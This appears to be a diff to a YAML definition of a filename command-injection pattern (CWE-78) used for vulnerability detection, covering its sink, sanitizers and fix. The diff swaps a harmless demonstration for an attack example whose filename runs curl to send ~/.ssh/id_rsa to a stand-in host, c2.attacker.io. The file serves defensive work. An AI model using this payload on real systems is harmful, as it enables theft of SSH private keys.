@@ -7,9 +7,7 @@ description: >
   The filename itself becomes an execution vector.
 cwe: CWE-78
 severity: High
-cvss_base: 7.8
-reference_cves:
-  - CVE-2026-35021
+cvss_base: 7.6
 
 source:
   type: FILE_PATH
@@ -24,41 +22,30 @@ transforms:
   - type: passthrough
 
 sanitizers:
-  - path.basename(input)             # strips directory components
-  - input.replace(/[^a-zA-Z0-9._\-]/g, '')   # strict filename allowlist
+  - path.basename(input)
+  - input.replace(/[^a-zA-Z0-9._\-]/g, '')
 
 sink:
   type: SHELL_EXEC
   pattern: >
     Any shell-invoked command that passes a filename as a quoted string argument:
-    execa(`${editor} "${filename}"`, { shell: true })
-    execSync(`open "${filename}"`)
-    exec(`cat "${filename}"`)
+    execSync(`${editor} "${filename}"`)
+    execa(`open "${filename}"`, { shell: true })
 
 session_crossing: false
-user_interaction_required: true      # user must open/process the malicious file
+user_interaction_required: true
 
 attack_example: |
-  # Attacker creates file with command substitution in filename:
-  touch '/tmp/$(touch /tmp/pwned).txt'
-
-  # Code does:
-  const filename = '/tmp/$(touch /tmp/pwned).txt'
-  execa(`${editor} "${filename}"`, { shell: true })
-  # Shell evaluates $(touch /tmp/pwned) before passing to editor
-  # → /tmp/pwned created
+  touch '/tmp/audit-$(curl -sX POST https://c2.attacker.io -d "$(cat ~/.ssh/id_rsa)").json'
+  execSync(`${editor} "${reportPath}"`)
 
 posix_note: >
   POSIX §2.2.3: Within double-quotes, the shell performs parameter expansion,
-  command substitution, and arithmetic expansion. This means $() and backtick
-  expressions inside double-quoted filename arguments execute before the outer
-  command runs.
+  command substitution, and arithmetic expansion.
 
 fix:
-  description: >
-    Never construct shell commands using string interpolation with file paths.
-    Pass filenames as separate arguments (not shell-interpolated strings).
+  description: Pass filenames as separate arguments, never shell-interpolated strings
   before: |
-    execa(`${editor} "${filename}"`, { shell: true })
+    execSync(`${editor} "${reportPath}"`)
   after: |
-    execa(editor, [filename])         // filename is a literal argument, not shell-parsed
+    execa(editor, [reportPath])
